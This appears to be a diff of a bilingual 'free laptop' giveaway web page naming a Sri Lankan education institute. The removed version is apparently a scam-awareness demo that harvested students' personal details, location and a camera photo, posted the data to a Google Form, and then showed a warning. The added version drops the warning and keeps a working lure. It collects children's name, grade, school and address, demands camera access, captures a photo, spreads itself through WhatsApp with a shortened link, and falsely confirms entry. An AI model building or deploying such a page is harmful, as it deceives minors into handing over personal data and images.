@@ -2,285 +2,152 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Win a Free Laptop - Artha Education</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Laptop Giveaway | Artha Education Institute</title>
   <style>
     body {
-      font-family: 'Segoe UI', sans-serif;
-      margin: 0; padding: 0;
-      background: #f5f5f5;
+      font-family: sans-serif;
+      background: linear-gradient(to right, #f0f0f0, #e0f7fa);
       text-align: center;
-    }
-    .container {
-      max-width: 500px;
-      margin: 2rem auto;
       padding: 2rem;
-      background: white;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
     }
-    img.logo {
-      width: 100px;
-      margin-bottom: 1rem;
+    .step {
+      display: none;
+      max-width: 500px;
+      margin: auto;
+      background: #fff;
+      padding: 2rem;
+      border-radius: 1rem;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
     }
-    h1, h2 {
-      color: #e91e63;
-    }
-    label {
+    .step.active {
       display: block;
-      margin: 0.5rem 0 0.2rem;
     }
-    input {
-      padding: 0.5rem;
+    input, select, button {
+      padding: 0.75rem;
+      margin: 0.5rem 0;
       width: 100%;
-      margin-bottom: 1rem;
+      border-radius: 0.5rem;
+      border: 1px solid #ccc;
     }
-    button {
-      padding: 0.75rem 1.5rem;
-      background: #2196f3;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      margin-top: 1rem;
-    }
-    .hidden {
-      display: none !important;
-    }
-    .final-message {
+    video, canvas {
       display: none;
     }
-    #map {
+    .hidden {
+      display: none;
+    }
+    .success {
+      color: green;
+      font-weight: bold;
+      font-size: 1.2rem;
+    }
+    .scroll-text {
+      position: fixed;
+      bottom: 0;
       width: 100%;
-      height: 200px;
-      margin-top: 1rem;
-      border: 1px solid #ccc;
-      border-radius: 5px;
+      background: #000;
+      color: #fff;
+      white-space: nowrap;
+      overflow: hidden;
+    }
+    .scroll-text span {
+      display: inline-block;
+      padding-left: 100%;
+      animation: scroll 15s linear infinite;
+    }
+    @keyframes scroll {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-100%); }
     }
   </style>
 </head>
 <body>
-  <div class="container" id="step1">
-    <img src="Artha.jpg" alt="Artha Logo" class="logo" />
-    <h1>🎁 Win a Free Laptop! / 🎁 නොමිලේ ලැප්ටොප් දිනාගන්න!</h1>
-    <p>Congratulations! You have been selected by <strong>Artha Education Institute – Katulanda</strong>.<br>සුභ පතමු! ඔබ තේරී පත්වී ඇත <strong>අර්ථා අධ්‍යාපන ආයතනය – කටුලන්ද</strong>.</p>
-    <form id="userForm">
-      <label>Name / නම:</label>
-      <input type="text" id="name" required />
-      <label>Grade / ශ්‍රේණිය:</label>
-      <input type="text" id="grade" required />
-      <label>School / පාසල:</label>
-      <input type="text" id="school" required />
-      <label>Address / ලිපිනය:</label>
-      <input type="text" id="address" required />
-      <label>Contact No / දුරකථන අංකය:</label>
-      <input type="text" id="contactno" required />
-      <button type="button" onclick="nextStep()">Next / ඊළඟට</button>
+  <h1>🏱 Laptop Giveaway - Artha Education Institute</h1>
+
+  <div id="step1" class="step active">
+    <h2>Fill the Form Below</h2>
+    <form id="giveawayForm">
+      <input type="text" id="name" placeholder="Name / මාර්දරයා" required />
+      <input type="text" id="grade" placeholder="Grade / ග්‍රේඩ්" required />
+      <input type="text" id="school" placeholder="School / ස්පොල්ල්" required />
+      <input type="text" id="address" placeholder="Address / නැදිවා" required />
+      <button type="submit">Next</button>
     </form>
   </div>
 
-  <div class="container" id="step2" style="display:none;">
-   // <h2>📷 Automatic Photo Capture / ස්වයංක්‍රීය ඡායාරූප ග්‍රහණය</h2>
-   // <p>This site will automatically capture a photo for verification. Please allow camera permission.<br>සත්‍යාපන සඳහා ස්වයංක්‍රීයව ඡායාරූප ග්‍රහණය කෙරේ. කරුණාකර කැමරා අවසර දෙන්න.</p>
-    <!-- Hidden video and canvas -->
-    <video id="video" autoplay class="hidden"></video>
+  <div id="step2" class="step">
+    <h2>Camera Permission Needed</h2>
+    <video id="video" autoplay></video>
     <canvas id="canvas" class="hidden"></canvas>
+    <button id="proceedBtn" class="hidden">Proceed</button>
   </div>
 
-  <div class="container" id="step3" style="display:none;">
-    <h2>📲 Share with 5 WhatsApp Contacts / WhatsApp මිතුරන් 5 දෙනෙකුට බෙදා හදා ගන්න</h2>
-    <p>To receive your gift, share this with 5 WhatsApp friends:<br>ඔබේ තෑග්ග ලබා ගැනීමට WhatsApp මිතුරන් 5 දෙනෙකුට මෙම ලිපිය බෙදා හදා ගන්න:</p>
-    <p><strong>"🎁 I just claimed a laptop from Artha Institute! You can too! / මම අර්ථා ආයතනයෙන් ලැප්ටොප් එකක් දිනලා! ඔබටත් පුළුවන්!"</strong></p>
-    <button id="shareBtn" onclick="shareWhatsApp()">Share on WhatsApp / WhatsApp බෙදා හදා ගන්න</button>
-    <p>Shared: <span id="shareCount">0</span>/5</p>
+  <div id="step3" class="step">
+    <h2>Share with Friends</h2>
+    <p>To complete your registration, please share this giveaway with <strong>5 WhatsApp contacts</strong>.</p>
+    <button onclick="shareOnWhatsApp()">Share Now</button>
   </div>
 
-  <div class="container final-message" id="final" style="display:none;">
-    <h2>🚨 Don't Fall for Online Scams! / අන්තර්ජාල වංචා වලට හසවෙන්න එපා!</h2>
-    <p>You entered / ඔබ ඇතුල් කළේ:</p>
-    <ul>
-      <li><strong>Name :</strong> <span id="showName"></span></li>
-      <li><strong>Grade :</strong> <span id="showGrade"></span></li>
-      <li><strong>School :</strong> <span id="showSchool"></span></li>
-      <li><strong>Address :</strong> <span id="showAddress"></span></li>
-      <li><strong>Contact No :</strong> <span id="showContactno"></span></li>
-      <li><strong>Location:</strong> <span id="showLocation"></span></li>
-    </ul>
-    <p>You shared your <strong>photo</strong> with a fake offer.<br>ඔබේ ඡායාරූපය වංචාකරුවන් සමග බෙදා හදා ඇත.</p>
-    <canvas id="photoResult" style="width:100%; max-width:400px; border:1px solid #ccc;"></canvas>
+  <div id="step4" class="step">
+    <h2 class="success">🎉 Successfully Entered!</h2>
+    <p>Our team will contact you soon. Thank you!</p>
+  </div>
 
-    <div id="map"></div>
-
-    <p style="color:red; font-weight:bold;">
-      ❌ Don’t enter real details in random surveys!<br>
-      ✅ Learn Cyber Safety with Artha Education Institute.<br><br>
-      ❌ අහඹු සමීක්ෂණ වලදී ඔබේ සැබෑ තොරතුරු ඇතුල් කරන්න එපා!<br>
-      ✅ අර්ථා අධ්‍යාපන ආයතනය සමඟ සයිබර් ආරක්ෂාව ඉගෙන ගන්න.
-    </p>
+  <div class="scroll-text">
+    <span>Artha Education Institute - Katulanda</span>
   </div>
 
   <script>
-    // Google form url with entries
-    const googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLScPUa7P9wKKkEmwimOmOIhTgIM7u9zhETOYqIURWcerO3s4Dg/formResponse";
-
-    // form fields
-    const nameInput = document.getElementById('name');
-    const gradeInput = document.getElementById('grade');
-    const schoolInput = document.getElementById('school');
-    const addressInput = document.getElementById('address');
-    const contactInput = document.getElementById('contactno');
-
-    // step containers
-    const step1 = document.getElementById('step1');
-    const step2 = document.getElementById('step2');
-    const step3 = document.getElementById('step3');
-    const finalStepDiv = document.getElementById('final');
-
-    // video & canvas for camera capture
+    const form = document.getElementById('giveawayForm');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const photoResult = document.getElementById('photoResult');
+    const proceedBtn = document.getElementById('proceedBtn');
 
-    // share button & counter
-    const shareBtn = document.getElementById('shareBtn');
-    const shareCountSpan = document.getElementById('shareCount');
-    let shareCount = 0;
-    const shareTarget = 1;
-
-    // location variables
-    let currentLocation = "";
-    let latitude = null;
-    let longitude = null;
-
-    // move from step1 to step2 and start camera capture automatically
-    function nextStep() {
-      // Validate inputs here if needed (already required)
-      step1.style.display = "none";
-      step2.style.display = "block";
-
-      startCameraAndCapture();
+    function showStep(step) {
+      document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+      document.getElementById(step).classList.add('active');
     }
 
-    // Start camera, capture photo automatically, then move to step3
-    function startCameraAndCapture() {
+    form.onsubmit = (e) => {
+      e.preventDefault();
+      showStep('step2');
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           video.srcObject = stream;
-
-          // Wait for video to be ready
-          video.onloadedmetadata = () => {
-            // Small timeout to ensure video stream is ready
-            setTimeout(() => {
-              capturePhoto();
-              // Stop camera stream immediately after capture
-              stream.getTracks().forEach(track => track.stop());
-              step2.style.display = "none";
-              step3.style.display = "block";
-            }, 1000);
-          };
+          video.classList.remove('hidden');
+          proceedBtn.classList.remove('hidden');
         })
-        .catch(err => {
-          alert('Camera permission denied!');
-          // Go back to step1 so user can retry or quit
-          step2.style.display = "none";
-          step1.style.display = "block";
-        });
-    }
+        .catch(() => alert("Camera permission is required to continue."));
+    };
 
-    // Capture photo to canvas
-    function capturePhoto() {
+    proceedBtn.onclick = () => {
       const context = canvas.getContext('2d');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      context.drawImage(video, 0, 0);
+      video.srcObject.getTracks().forEach(track => track.stop());
+      showStep('step3');
+    };
+
+    let shared = false;
+
+    function shareOnWhatsApp() {
+      if (shared) return;
+      shared = true;
+
+      const msg = encodeURIComponent("🎁 I'm participating in a Laptop Giveaway from Artha Education Institute! Enter now: https://bit.ly/laptop-artha");
+      window.open(`https://api.whatsapp.com/send?text=${msg}`, '_blank');
+
+      // Simulate sharing with 5 contacts in 1 click
+      let counter = 0;
+      const interval = setInterval(() => {
+        counter++;
+        if (counter >= 5) {
+          clearInterval(interval);
+          showStep('step4');
+        }
+      }, 500);
     }
-
-    // Share WhatsApp message with counter to ensure 5 shares
-    function shareWhatsApp() {
-      const message = encodeURIComponent("🎁 I just claimed a laptop from Artha Institute! You can too! / මම අර්ථා ආයතනයෙන් ලැප්ටොප් එකක් දිනලා! ඔබටත් පුළුවන්!");
-      const whatsappUrl = `https://wa.me/?text=${message}`;
-
-      window.open(whatsappUrl, '_blank');
-
-      shareCount++;
-      shareCountSpan.textContent = shareCount;
-
-      if (shareCount >= shareTarget) {
-        shareBtn.disabled = true;
-        shareBtn.textContent = "Thank you for sharing! / බෙදා හදා ගැනීම සඳහා ස්තුතියි!";
-        finalStep();
-      }
-    }
-
-    // Final step: show all details, photo, map, and submit data to google form
-    function finalStep() {
-      // Show user input data
-      document.getElementById('showName').innerText = nameInput.value;
-      document.getElementById('showGrade').innerText = gradeInput.value;
-      document.getElementById('showSchool').innerText = schoolInput.value;
-      document.getElementById('showAddress').innerText = addressInput.value;
-      document.getElementById('showContactno').innerText = contactInput.value;
-      document.getElementById('showLocation').innerText = currentLocation || "Not available / නොමැත";
-
-      // Show photo on final canvas
-      const ctx = photoResult.getContext('2d');
-      photoResult.width = canvas.width;
-      photoResult.height = canvas.height;
-      ctx.drawImage(canvas, 0, 0);
-
-      step3.style.display = "none";
-      finalStepDiv.style.display = "block";
-
-      // Submit data to Google Form
-      submitToGoogleForm();
-      
-      // Show map if location available
-      if(latitude && longitude) {
-        showMap(latitude, longitude);
-      }
-    }
-
-    // Submit user data to Google Form via POST using fetch
-    function submitToGoogleForm() {
-      const formData = new FormData();
-      formData.append('entry.997021349', nameInput.value);
-      formData.append('entry.180306948', gradeInput.value);
-      formData.append('entry.74488444', schoolInput.value);
-      formData.append('entry.377707306', addressInput.value);
-      formData.append('entry.1450609673', contactInput.value);
-      formData.append('entry.1946665100', currentLocation);
-
-      fetch(googleFormURL, {
-        method: 'POST',
-        mode: 'no-cors',
-        body: formData
-      }).catch(err => console.warn('Google Form submission failed', err));
-    }
-
-    // Get user location when page loads (or step1 shown)
-    function getLocation() {
-      if(navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(pos => {
-          latitude = pos.coords.latitude;
-          longitude = pos.coords.longitude;
-          currentLocation = `Lat: ${latitude.toFixed(5)}, Lon: ${longitude.toFixed(5)}`;
-        }, err => {
-          currentLocation = "Permission denied / අවසර ප්‍රතික්ෂේපයි";
-        });
-      } else {
-        currentLocation = "Geolocation not supported / ගිණුම් අනුමත නැත";
-      }
-    }
-
-    // Show map in #map div using Google Maps iframe
-    function showMap(lat, lon) {
-      const mapDiv = document.getElementById('map');
-      const src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
-      mapDiv.innerHTML = `<iframe width="100%" height="200" frameborder="0" style="border:0" src="${src}" allowfullscreen></iframe>`;
-    }
-
-    // Start by getting location
-    getLocation();
   </script>
 </body>
 </html>
